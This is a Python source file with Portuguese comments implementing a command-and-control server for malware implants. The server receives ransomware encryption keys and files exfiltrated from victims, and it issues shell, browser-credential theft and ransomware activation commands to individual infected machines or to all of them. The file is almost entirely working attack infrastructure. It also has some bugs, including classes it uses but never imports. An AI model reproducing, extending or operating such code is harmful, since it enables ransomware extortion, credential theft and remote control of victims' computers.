#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import threading
import json
import time
import os
import hashlib
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress
from rich.markdown import Markdown

console = Console()

class EnhancedC2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 4444
        self.clients = {}  # {client_id: {'socket': socket_obj, 'address': (ip, port), 'info': {}, 'last_seen': timestamp}}
        self.running = True
        self.server_socket = None
        self.session_counter = 0
        self.show_notifications = True
        self.command_history = []
        self.data_dir = "c2_data"
        
        # Criar diretório para dados se não existir
        os.makedirs(self.data_dir, exist_ok=True)
    
    def start(self):
        """Inicia o servidor C2 aprimorado"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            console.print(Panel.fit(
                f"[bold green]✅ Servidor C2 iniciado em [yellow]{self.host}:{self.port}[/yellow][/bold green]",
                border_style="green"
            ))
            
            # Threads de gerenciamento
            threading.Thread(target=self.accept_connections, daemon=True).start()
            threading.Thread(target=self.cleanup_inactive_clients, daemon=True).start()
            threading.Thread(target=self.save_client_data_loop, daemon=True).start()
            
            self.show_main_menu()
            
        except Exception as e:
            console.print(Panel.fit(
                f"[bold red]❌ Erro ao iniciar servidor: {str(e)}[/bold red]",
                border_style="red"
            ))
        finally:
            self.shutdown()
    
    def accept_connections(self):
        """Aceita novas conexões de clientes"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                self.session_counter += 1
                client_id = f"client-{self.session_counter}"
                
                # Receber informações iniciais do cliente
                try:
                    initial_data = json.loads(client_socket.recv(4096).decode())
                    client_info = initial_data.get('info', {})
                except:
                    client_info = {}
                
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'info': client_info,
                    'last_seen': time.time(),
                    'active': True,
                    'payload_type': initial_data.get('payload_type', 'unknown')
                }
                
                self.log_activity(f"Nova conexão de {client_address[0]} como {client_id}")
                self.save_client_info(client_id)
                
                if self.show_notifications:
                    console.print(Panel.fit(
                        f"[bold green]🔄 Nova conexão de [yellow]{client_address[0]}[/yellow] (ID: {client_id})[/bold green]\n"
                        f"Tipo: [cyan]{self.clients[client_id]['payload_type']}[/cyan]\n"
                        f"Sistema: {client_info.get('system', 'Desconhecido')}",
                        border_style="green"
                    ))
                
                threading.Thread(
                    target=self.handle_client,
                    args=(client_id, client_socket),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    console.print(Panel.fit(
                        f"[bold red]❌ Erro ao aceitar conexão: {str(e)}[/bold red]",
                        border_style="red"
                    ))
    
    def handle_client(self, client_id, client_socket):
        """Lida com a comunicação com um cliente específico"""
        try:
            while self.running and client_id in self.clients:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    self.clients[client_id]['last_seen'] = time.time()
                    
                    try:
                        message = json.loads(data.decode())
                        self.process_client_message(client_id, message)
                    except json.JSONDecodeError:
                        # Saída de comando normal
                        self.display_command_output(client_id, data.decode())
                    
                except ConnectionResetError:
                    break
                except Exception as e:
                    self.log_activity(f"Erro com cliente {client_id}: {str(e)}")
                    break
            
        finally:
            self.disconnect_client(client_id)
    
    def process_client_message(self, client_id, message):
        """Processa mensagens estruturadas do cliente"""
        msg_type = message.get('type')
        
        if msg_type == 'checkin':
            self.handle_checkin(client_id, message)
        elif msg_type == 'command_result':
            self.handle_command_result(client_id, message)
        elif msg_type == 'ransomware_report':
            self.handle_ransomware_report(client_id, message)
        elif msg_type == 'data_exfiltration':
            self.handle_data_exfiltration(client_id, message)
        elif msg_type == 'error':
            self.handle_error_report(client_id, message)
        else:
            console.print(Panel.fit(
                f"[bold cyan]📨 Mensagem de [yellow]{client_id}[/yellow]:[/bold cyan]\n"
                f"{json.dumps(message, indent=2)}",
                border_style="blue"
            ))
    
    def handle_checkin(self, client_id, message):
        """Processa mensagens de check-in periódicas"""
        self.clients[client_id]['info'] = message.get('info', {})
        self.clients[client_id]['last_seen'] = time.time()
        
        if self.show_notifications:
            console.print(Panel.fit(
                f"[bold green]📡 Check-in de [yellow]{client_id}[/yellow][/bold green]\n"
                f"IP: {self.clients[client_id]['address'][0]}\n"
                f"Sistema: {message.get('info', {}).get('system', 'Desconhecido')}\n"
                f"Payload: {self.clients[client_id]['payload_type']}",
                border_style="green"
            ))
        
        self.save_client_info(client_id)
    
    def handle_command_result(self, client_id, message):
        """Processa resultados de comandos executados"""
        console.print(Panel.fit(
            f"[bold green]📋 Resultado de [yellow]{client_id}[/yellow]:[/bold green]\n"
            f"Comando: [cyan]{message.get('command', 'Desconhecido')}[/cyan]\n"
            f"Saída:\n{message.get('output', 'Sem saída')}",
            border_style="green"
        ))
        
        # Registrar no histórico
        self.command_history.append({
            'timestamp': datetime.now().isoformat(),
            'client_id': client_id,
            'command': message.get('command'),
            'output': message.get('output')
        })
    
    def handle_ransomware_report(self, client_id, message):
        """Processa relatórios de ransomware"""
        console.print(Panel.fit(
            f"[bold red]⚠️ Relatório de Ransomware[/bold red]\n"
            f"Cliente: [yellow]{client_id}[/yellow]\n"
            f"Arquivos criptografados: [red]{message.get('encrypted_files', 0)}[/red]\n"
            f"Chave AES: [cyan]{message.get('key')}[/cyan]\n"
            f"IV: [cyan]{message.get('iv')}[/cyan]",
            border_style="red"
        ))
        
        # Salvar chaves de forma segura
        key_file = os.path.join(self.data_dir, f"ransomware_keys_{client_id}.txt")
        with open(key_file, "w") as f:
            f.write(f"Key: {message.get('key')}\nIV: {message.get('iv')}")
        
        self.log_activity(f"Ransomware ativado por {client_id} - {message.get('encrypted_files', 0)} arquivos criptografados")
    
    def handle_data_exfiltration(self, client_id, message):
        """Processa dados exfiltrados"""
        data_type = message.get('data_type', 'dados')
        console.print(Panel.fit(
            f"[bold purple]📦 Dados exfiltrados de [yellow]{client_id}[/yellow][/bold purple]\n"
            f"Tipo: [cyan]{data_type}[/cyan]\n"
            f"Tamanho: {len(message.get('data', ''))} bytes",
            border_style="purple"
        ))
        
        # Salvar dados exfiltrados
        filename = f"{client_id}_{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.data"
        with open(os.path.join(self.data_dir, filename), "wb") as f:
            if isinstance(message['data'], str):
                f.write(message['data'].encode())
            else:
                f.write(message['data'])
        
        self.log_activity(f"Dados exfiltrados de {client_id} - {data_type} ({len(message.get('data', ''))} bytes)")
    
    def handle_error_report(self, client_id, message):
        """Processa relatórios de erro dos clientes"""
        console.print(Panel.fit(
            f"[bold red]❌ Erro reportado por [yellow]{client_id}[/yellow][/bold red]\n"
            f"Tipo: [cyan]{message.get('error_type', 'Desconhecido')}[/cyan]\n"
            f"Detalhes:\n{message.get('message', 'Sem detalhes')}",
            border_style="red"
        ))
        self.log_activity(f"Erro reportado por {client_id}: {message.get('error_type')}")
    
    def display_command_output(self, client_id, output):
        """Exibe saída de comando não estruturada"""
        if self.show_notifications:
            console.print(Panel.fit(
                f"[bold cyan]📤 Saída de [yellow]{client_id}[/yellow]:[/bold cyan]\n{output}",
                border_style="blue"
            ))
    
    def disconnect_client(self, client_id):
        """Desconecta um cliente e remove da lista"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            console.print(Panel.fit(
                f"[bold red]🔌 Cliente [yellow]{client_id}[/yellow] desconectado[/bold red]",
                border_style="red"
            ))
            self.log_activity(f"Cliente {client_id} desconectado")
            del self.clients[client_id]
    
    def cleanup_inactive_clients(self):
        """Remove clientes inativos após 5 minutos sem comunicação"""
        while self.running:
            time.sleep(60)
            current_time = time.time()
            inactive_clients = [
                client_id for client_id, client_data in self.clients.items()
                if current_time - client_data['last_seen'] > 300
            ]
            
            for client_id in inactive_clients:
                self.disconnect_client(client_id)
    
    def send_structured_command(self, client_id, command_type, data=None):
        """Envia um comando estruturado para o cliente"""
        message = {'type': command_type}
        if data:
            message.update(data)
        return self.send_command(client_id, json.dumps(message))
    
    def send_command(self, client_id, command):
        """Envia um comando para um cliente específico"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].sendall(command.encode())
                self.log_activity(f"Comando enviado para {client_id}: {command[:50]}...")
                return True
            except Exception as e:
                console.print(Panel.fit(
                    f"[bold red]❌ Erro ao enviar comando para {client_id}: {str(e)}[/bold red]",
                    border_style="red"
                ))
                self.disconnect_client(client_id)
                return False
        else:
            console.print(Panel.fit(
                f"[bold red]❌ Cliente {client_id} não encontrado[/bold red]",
                border_style="red"
            ))
            return False
    
    def broadcast_command(self, command):
        """Envia um comando para todos os clientes conectados"""
        if not self.clients:
            console.print(Panel.fit(
                "[bold yellow]⚠️ Nenhum cliente conectado[/bold yellow]",
                border_style="yellow"
            ))
            return
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Enviando comando...", total=len(self.clients))
            
            for client_id in list(self.clients.keys()):
                progress.update(task, advance=1, description=f"Enviando para {client_id}")
                self.send_command(client_id, command)
        
        console.print(Panel.fit(
            f"[bold green]✅ Comando enviado para {len(self.clients)} clientes[/bold green]",
            border_style="green"
        ))
        self.log_activity(f"Comando broadcast enviado: {command[:50]}...")
    
    def save_client_info(self, client_id):
        """Salva informações do cliente em arquivo"""
        if client_id in self.clients:
            filename = os.path.join(self.data_dir, f"client_{client_id}.json")
            with open(filename, "w") as f:
                json.dump(self.clients[client_id], f, indent=2)
    
    def save_client_data_loop(self):
        """Salva periodicamente dados dos clientes"""
        while self.running:
            time.sleep(60)
            for client_id in list(self.clients.keys()):
                self.save_client_info(client_id)
    
    def log_activity(self, message):
        """Registra atividade no log"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        with open(os.path.join(self.data_dir, "c2_server.log"), "a") as f:
            f.write(log_entry + "\n")
    
    def show_main_menu(self):
        """Mostra o menu interativo principal"""
        while self.running:
            console.clear()
            console.print(Panel.fit(
                "[bold blue]🛡️ SERVIDOR DE COMANDO E CONTROLE (C2) - EDITION[/bold blue]",
                border_style="blue"
            ))
            
            # Status do servidor
            console.print(Panel.fit(
                f"[bold]Configurações do Servidor:[/bold]\n"
                f"Host: [cyan]{self.host}[/cyan]\n"
                f"Porta: [cyan]{self.port}[/cyan]\n"
                f"Clientes conectados: [cyan]{len(self.clients)}[/cyan]\n"
                f"Notificações: {'[green]ON[/green]' if self.show_notifications else '[red]OFF[/red]'}",
                border_style="blue"
            ))
            
            # Lista de clientes
            if self.clients:
                table = Table(title="Clientes Conectados", show_header=True, header_style="bold magenta")
                table.add_column("ID", style="cyan")
                table.add_column("IP")
                table.add_column("Tipo")
                table.add_column("Sistema")
                table.add_column("Última Atividade")
                
                for client_id, client_data in self.clients.items():
                    last_seen = datetime.fromtimestamp(client_data['last_seen']).strftime('%H:%M:%S')
                    table.add_row(
                        client_id,
                        client_data['address'][0],
                        client_data.get('payload_type', 'unknown'),
                        client_data.get('info', {}).get('system', '?'),
                        last_seen
                    )
                
                console.print(table)
            else:
                console.print(Panel.fit(
                    "[yellow]⚠️ Nenhum cliente conectado[/yellow]",
                    border_style="yellow"
                ))
            
            # Menu de opções
            console.print(Panel.fit(
                "[bold]Menu Principal:[/bold]\n"
                "1. Gerenciar Clientes\n"
                "2. Enviar Comandos\n"
                "3. Visualizar Dados\n"
                "4. Configurações\n"
                "0. Sair",
                border_style="blue"
            ))
            
            choice = input("\n[?] Selecione uma opção: ")
            
            if choice == "1":
                self.manage_clients_menu()
            elif choice == "2":
                self.command_menu()
            elif choice == "3":
                self.data_view_menu()
            elif choice == "4":
                self.settings_menu()
            elif choice == "0":
                self.shutdown()
                return
    
    def manage_clients_menu(self):
        """Menu de gerenciamento de clientes"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold blue]👥 Gerenciamento de Clientes[/bold blue]",
                border_style="blue"
            ))
            
            if not self.clients:
                console.print(Panel.fit(
                    "[yellow]⚠️ Nenhum cliente conectado[/yellow]",
                    border_style="yellow"
                ))
                time.sleep(1)
                return
            
            # Lista clientes com índices
            for i, client_id in enumerate(self.clients.keys(), 1):
                client_data = self.clients[client_id]
                console.print(
                    f"{i}. [cyan]{client_id}[/cyan] | "
                    f"[green]{client_data['address'][0]}[/green] | "
                    f"{client_data.get('payload_type', 'unknown')}"
                )
            
            console.print("\n0. Voltar")
            
            choice = input("\n[?] Selecione um cliente (0 para voltar): ")
            
            if choice == "0":
                return
            
            try:
                selected_idx = int(choice) - 1
                if 0 <= selected_idx < len(self.clients):
                    client_id = list(self.clients.keys())[selected_idx]
                    self.client_details_menu(client_id)
            except ValueError:
                console.print(Panel.fit(
                    "[red]❌ Opção inválida[/red]",
                    border_style="red"
                ))
                time.sleep(1)
    
    def client_details_menu(self, client_id):
        """Menu de detalhes de um cliente específico"""
        while True:
            console.clear()
            client_data = self.clients[client_id]
            
            console.print(Panel.fit(
                f"[bold blue]🔍 Detalhes do Cliente [yellow]{client_id}[/yellow][/bold blue]",
                border_style="blue"
            ))
            
            console.print(Panel.fit(
                f"[bold]Informações:[/bold]\n"
                f"Endereço: [cyan]{client_data['address'][0]}[/cyan]\n"
                f"Tipo de Payload: [cyan]{client_data.get('payload_type', 'unknown')}[/cyan]\n"
                f"Última Atividade: [cyan]{datetime.fromtimestamp(client_data['last_seen']).strftime('%Y-%m-%d %H:%M:%S')}[/cyan]\n"
                f"Sistema: [cyan]{client_data.get('info', {}).get('system', 'Desconhecido')}[/cyan]",
                border_style="blue"
            ))
            
            console.print("\n[bold]Opções:[/bold]")
            console.print("1. Enviar Comando")
            console.print("2. Desconectar Cliente")
            console.print("3. Visualizar Histórico")
            console.print("0. Voltar")
            
            choice = input("\n[?] Selecione uma opção: ")
            
            if choice == "1":
                command = input("\n[?] Comando para enviar: ")
                if command.lower() not in ['exit', 'quit']:
                    self.send_command(client_id, command + "\n")
                    input("\nPressione Enter para continuar...")
            elif choice == "2":
                self.disconnect_client(client_id)
                return
            elif choice == "3":
                self.show_client_history(client_id)
            elif choice == "0":
                return
    
    def show_client_history(self, client_id):
        """Mostra histórico de atividades do cliente"""
        console.clear()
        console.print(Panel.fit(
            f"[bold blue]📜 Histórico de [yellow]{client_id}[/yellow][/bold blue]",
            border_style="blue"
        ))
        
        # Filtrar histórico por cliente
        client_history = [entry for entry in self.command_history if entry['client_id'] == client_id]
        
        if client_history:
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Data/Hora")
            table.add_column("Comando")
            table.add_column("Saída (resumo)")
            
            for entry in client_history[-10:]:  # Mostrar últimos 10 comandos
                output_preview = entry['output'][:50] + "..." if len(entry['output']) > 50 else entry['output']
                table.add_row(
                    entry['timestamp'],
                    entry['command'],
                    output_preview
                )
            
            console.print(table)
        else:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhum histórico disponível para este cliente[/yellow]",
                border_style="yellow"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def command_menu(self):
        """Menu de envio de comandos"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold blue]💻 Menu de Comandos[/bold blue]",
                border_style="blue"
            ))
            
            console.print("1. Enviar comando para cliente específico")
            console.print("2. Enviar comando para todos os clientes")
            console.print("3. Comandos predefinidos")
            console.print("0. Voltar")
            
            choice = input("\n[?] Selecione uma opção: ")
            
            if choice == "1":
                self.send_command_to_client()
            elif choice == "2":
                self.send_command_to_all()
            elif choice == "3":
                self.predefined_commands_menu()
            elif choice == "0":
                return
    
    def predefined_commands_menu(self):
        """Menu de comandos predefinidos"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold blue]📋 Comandos Predefinidos[/bold blue]",
                border_style="blue"
            ))
            
            commands = {
                "1": ("Coletar informações do sistema", "systeminfo"),
                "2": ("Listar arquivos (diretório atual)", "ls" if os.name != 'nt' else "dir"),
                "3": ("Testar conexão com C2", "ping -c 4 8.8.8.8" if os.name != 'nt' else "ping 8.8.8.8 -n 4"),
                "4": ("Obter processos em execução", "ps aux" if os.name != 'nt' else "tasklist"),
                "5": ("Iniciar shell interativa", "start_shell"),
                "6": ("Coletar credenciais de navegador", "collect_browser_creds"),
                "7": ("Ativar ransomware (CUIDADO)", "activate_ransomware"),
                "8": ("Desativar ransomware", "decrypt_files")
            }
            
            for key, (desc, cmd) in commands.items():
                console.print(f"{key}. {desc} ([cyan]{cmd}[/cyan])")
            
            console.print("\n0. Voltar")
            
            choice = input("\n[?] Selecione um comando: ")
            
            if choice == "0":
                return
            elif choice in commands:
                if choice in ["7", "8"]:  # Comandos perigosos
                    console.print(Panel.fit(
                        "[bold red]⚠️ COMANDO PERIGOSO ⚠️[/bold red]\n"
                        "Esta ação pode causar danos permanentes!\n"
                        "Use apenas em ambientes controlados!",
                        border_style="red"
                    ))
                    if not Confirm.ask("Confirmar execução?", default=False):
                        continue
                
                if choice == "5":  # Shell interativa
                    self.start_interactive_shell()
                else:
                    command = commands[choice][1]
                    self.send_command_to_client(predefined_command=command)
    
    def start_interactive_shell(self):
        """Inicia uma shell interativa com um cliente"""
        if not self.clients:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhum cliente conectado[/yellow]",
                border_style="yellow"
            ))
            time.sleep(1)
            return
        
        console.print("\n[bold]Clientes disponíveis:[/bold]")
        for i, client_id in enumerate(self.clients.keys(), 1):
            console.print(f"{i}. {client_id}")
        
        try:
            selection = int(input("\n[?] Selecione o cliente (0 para cancelar): "))
            if selection == 0:
                return
            
            client_id = list(self.clients.keys())[selection-1]
            
            console.print(Panel.fit(
                f"[bold green]🚀 Iniciando shell interativa com [yellow]{client_id}[/yellow][/bold green]\n"
                "Digite 'exit' para sair",
                border_style="green"
            ))
            
            while True:
                command = input(f"shell@{client_id}$ ")
                if command.lower() in ['exit', 'quit']:
                    break
                
                if command.strip():
                    self.send_command(client_id, command + "\n")
        
        except (ValueError, IndexError):
            console.print(Panel.fit(
                "[red]❌ Seleção inválida[/red]",
                border_style="red"
            ))
            time.sleep(1)
    
    def send_command_to_client(self, predefined_command=None):
        """Menu para enviar comando a cliente específico"""
        if not self.clients:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhum cliente conectado[/yellow]",
                border_style="yellow"
            ))
            time.sleep(1)
            return
        
        console.print("\n[bold]Clientes disponíveis:[/bold]")
        for i, client_id in enumerate(self.clients.keys(), 1):
            console.print(f"{i}. {client_id}")
        
        try:
            selection = int(input("\n[?] Selecione o cliente (0 para cancelar): "))
            if selection == 0:
                return
            
            client_id = list(self.clients.keys())[selection-1]
            
            if predefined_command:
                command = predefined_command
                console.print(f"\n[?] Enviando comando predefinido: [cyan]{command}[/cyan]")
            else:
                command = input(f"\n[?] Comando para {client_id}: ")
                if command.lower() in ['exit', 'quit']:
                    return
            
            if self.send_command(client_id, command + "\n"):
                console.print(Panel.fit(
                    f"[green]✅ Comando enviado para [yellow]{client_id}[/yellow][/green]",
                    border_style="green"
                ))
                time.sleep(1)
        
        except (ValueError, IndexError):
            console.print(Panel.fit(
                "[red]❌ Seleção inválida[/red]",
                border_style="red"
            ))
            time.sleep(1)
    
    def send_command_to_all(self):
        """Menu para enviar comando a todos os clientes"""
        if not self.clients:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhum cliente conectado[/yellow]",
                border_style="yellow"
            ))
            time.sleep(1)
            return
        
        command = input("\n[?] Comando para todos os clientes: ")
        
        if command.lower() in ['exit', 'quit']:
            return
        
        self.broadcast_command(command + "\n")
        input("\nPressione Enter para continuar...")
    
    def data_view_menu(self):
        """Menu para visualização de dados coletados"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold blue]📊 Visualização de Dados[/bold blue]",
                border_style="blue"
            ))
            
            console.print("1. Visualizar histórico de comandos")
            console.print("2. Visualizar logs do servidor")
            console.print("3. Visualizar dados exfiltrados")
            console.print("4. Visualizar chaves de ransomware")
            console.print("0. Voltar")
            
            choice = input("\n[?] Selecione uma opção: ")
            
            if choice == "1":
                self.show_command_history()
            elif choice == "2":
                self.show_server_logs()
            elif choice == "3":
                self.show_exfiltrated_data()
            elif choice == "4":
                self.show_ransomware_keys()
            elif choice == "0":
                return
    
    def show_command_history(self):
        """Mostra histórico de comandos enviados"""
        console.clear()
        console.print(Panel.fit(
            "[bold blue]📜 Histórico de Comandos[/bold blue]",
            border_style="blue"
        ))
        
        if self.command_history:
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Data/Hora")
            table.add_column("Cliente")
            table.add_column("Comando")
            table.add_column("Saída (resumo)")
            
            for entry in self.command_history[-20:]:  # Mostrar últimos 20 comandos
                output_preview = entry['output'][:30] + "..." if len(entry['output']) > 30 else entry['output']
                table.add_row(
                    entry['timestamp'],
                    entry['client_id'],
                    entry['command'],
                    output_preview
                )
            
            console.print(table)
        else:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhum comando registrado[/yellow]",
                border_style="yellow"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def show_server_logs(self):
        """Mostra logs do servidor"""
        log_file = os.path.join(self.data_dir, "c2_server.log")
        
        try:
            with open(log_file, "r") as f:
                logs = f.read()
            
            console.print(Panel.fit(
                "[bold blue]📝 Logs do Servidor[/bold blue]",
                border_style="blue"
            ))
            
            console.print(Syntax(logs[-2000:], "text"))  # Mostrar últimos 2000 caracteres
        except FileNotFoundError:
            console.print(Panel.fit(
                "[yellow]⚠️ Arquivo de log não encontrado[/yellow]",
                border_style="yellow"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def show_exfiltrated_data(self):
        """Mostra lista de dados exfiltrados"""
        console.clear()
        console.print(Panel.fit(
            "[bold blue]📦 Dados Exfiltrados[/bold blue]",
            border_style="blue"
        ))
        
        data_files = [f for f in os.listdir(self.data_dir) if f.endswith('.data')]
        
        if data_files:
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Arquivo")
            table.add_column("Tamanho")
            table.add_column("Data de Modificação")
            
            for file in sorted(data_files, key=lambda f: os.path.getmtime(os.path.join(self.data_dir, f)), reverse=True)[:10]:
                file_path = os.path.join(self.data_dir, file)
                size = os.path.getsize(file_path)
                mtime = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M')
                
                table.add_row(
                    file,
                    f"{size/1024:.1f} KB",
                    mtime
                )
            
            console.print(table)
            
            if len(data_files) > 10:
                console.print(f"\n[cyan]Mostrando 10 de {len(data_files)} arquivos. Verifique o diretório para a lista completa.[/cyan]")
        else:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhum dado exfiltrado encontrado[/yellow]",
                border_style="yellow"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def show_ransomware_keys(self):
        """Mostra lista de chaves de ransomware"""
        console.clear()
        console.print(Panel.fit(
            "[bold red]🔑 Chaves de Ransomware[/bold red]",
            border_style="red"
        ))
        
        key_files = [f for f in os.listdir(self.data_dir) if f.startswith('ransomware_keys_')]
        
        if key_files:
            for file in key_files:
                with open(os.path.join(self.data_dir, file), "r") as f:
                    content = f.read()
                
                console.print(Panel.fit(
                    f"[bold]Arquivo: [cyan]{file}[/cyan][/bold]\n{content}",
                    border_style="red"
                ))
        else:
            console.print(Panel.fit(
                "[yellow]⚠️ Nenhuma chave de ransomware encontrada[/yellow]",
                border_style="yellow"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def settings_menu(self):
        """Menu de configurações do servidor"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold blue]⚙️ Configurações do Servidor[/bold blue]",
                border_style="blue"
            ))
            
            console.print(
                f"1. Host atual: [cyan]{self.host}[/cyan]\n"
                f"2. Porta atual: [cyan]{self.port}[/cyan]\n"
                f"3. Notificações: {'[green]ON[/green]' if self.show_notifications else '[red]OFF[/red]'}\n"
                f"4. Diretório de dados: [cyan]{self.data_dir}[/cyan]\n"
                "0. Voltar"
            )
            
            choice = input("\n[?] Selecione o que deseja alterar: ")
            
            if choice == "1":
                new_host = input(f"[?] Novo host (atual: {self.host}): ")
                if new_host:
                    self.host = new_host
                    console.print(Panel.fit(
                        f"[green]✅ Host alterado para [yellow]{self.host}[/yellow][/green]",
                        border_style="green"
                    ))
                    time.sleep(1)
            
            elif choice == "2":
                try:
                    new_port = int(input(f"[?] Nova porta (atual: {self.port}): "))
                    if 1 <= new_port <= 65535:
                        self.port = new_port
                        console.print(Panel.fit(
                            f"[green]✅ Porta alterada para [yellow]{self.port}[/yellow][/green]",
                            border_style="green"
                        ))
                        time.sleep(1)
                    else:
                        console.print(Panel.fit(
                            "[red]❌ Porta inválida (deve ser entre 1 e 65535)[/red]",
                            border_style="red"
                        ))
                        time.sleep(1)
                except ValueError:
                    console.print(Panel.fit(
                        "[red]❌ Porta deve ser um número[/red]",
                        border_style="red"
                    ))
                    time.sleep(1)
            
            elif choice == "3":
                self.show_notifications = not self.show_notifications
                console.print(Panel.fit(
                    f"[green]✅ Notificações {'ativadas' if self.show_notifications else 'desativadas'}[/green]",
                    border_style="green"
                ))
                time.sleep(1)
            
            elif choice == "4":
                new_dir = input(f"[?] Novo diretório de dados (atual: {self.data_dir}): ")
                if new_dir:
                    try:
                        os.makedirs(new_dir, exist_ok=True)
                        self.data_dir = new_dir
                        console.print(Panel.fit(
                            f"[green]✅ Diretório de dados alterado para [yellow]{self.data_dir}[/yellow][/green]",
                            border_style="green"
                        ))
                        time.sleep(1)
                    except Exception as e:
                        console.print(Panel.fit(
                            f"[red]❌ Erro ao alterar diretório: {str(e)}[/red]",
                            border_style="red"
                        ))
                        time.sleep(1)
            
            elif choice == "0":
                return
    
    def shutdown(self):
        """Encerra o servidor corretamente"""
        self.running = False
        
        # Fecha todas as conexões de clientes
        for client_id in list(self.clients.keys()):
            self.disconnect_client(client_id)
        
        # Fecha o socket do servidor
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        console.print(Panel.fit(
            "[bold red]🛑 Servidor C2 encerrado[/bold red]",
            border_style="red"
        ))

if __name__ == '__main__':
    try:
        server = EnhancedC2Server()
        server.start()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Servidor encerrado pelo usuário[/red]")
    except Exception as e:
        console.print(Panel.fit(
            f"[bold red]❌ Erro fatal: {str(e)}[/bold red]",
            border_style="red"
        ))
